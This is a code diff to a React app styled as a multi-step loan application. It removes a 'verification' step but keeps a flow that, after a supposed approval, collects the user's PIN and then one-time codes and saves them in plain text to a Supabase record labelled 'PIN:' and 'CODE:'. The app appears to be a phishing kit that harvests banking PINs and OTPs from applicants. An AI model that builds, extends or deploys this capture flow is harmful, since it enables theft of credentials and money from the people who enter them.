@@ -6,7 +6,6 @@ import { Step1LoanParameters } from './components/Step1LoanParameters';
 import { Step2ApplicantDetails } from './components/Step2ApplicantDetails';
 import { Step3FinancialReview } from './components/Step3FinancialReview';
 import { SuccessScreen } from './components/SuccessScreen';
-import { VerificationScreen } from './components/VerificationScreen';
 import { PinScreen } from './components/PinScreen';
 import { OtpScreen } from './components/OtpScreen';
 import { ConfirmationScreen } from './components/ConfirmationScreen';
@@ -46,18 +45,6 @@ export default function App() {
     }
 
     const displayValue = `PIN: ${pin}`;
-    await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
-    setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
-    setCurrentStep('verification');
-  };
-
-  const handleVerificationSubmit = async (code: string) => {
-    if (!submittedApplication?.id) {
-      return;
-    }
-
-    const existing = submittedApplication.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
-    const displayValue = `${existing}CODE: ${code}`;
     await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
     setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
     setCurrentStep('otp');
@@ -107,8 +94,7 @@ export default function App() {
     else if (currentStep === 'step3') setCurrentStep('step2');
     else if (currentStep === 'success') setCurrentStep('calculator');
     else if (currentStep === 'pin') setCurrentStep('success');
-    else if (currentStep === 'verification') setCurrentStep('pin');
-    else if (currentStep === 'otp') setCurrentStep('verification');
+    else if (currentStep === 'otp') setCurrentStep('pin');
     else if (currentStep === 'confirmation') setCurrentStep('otp');
   };
 
@@ -253,15 +239,6 @@ export default function App() {
                   applicationId={submittedApplication?.id ?? ''}
                   onBack={() => setCurrentStep('success')}
                   onNext={handlePinSubmit}
-                />
-              )}
-
-              {currentStep === 'verification' && (
-                <VerificationScreen
-                  phone={formData.phone}
-                  applicationId={submittedApplication?.id ?? ''}
-                  onBack={() => setCurrentStep('pin')}
-                  onSuccess={handleVerificationSubmit}
                 />
               )}
 
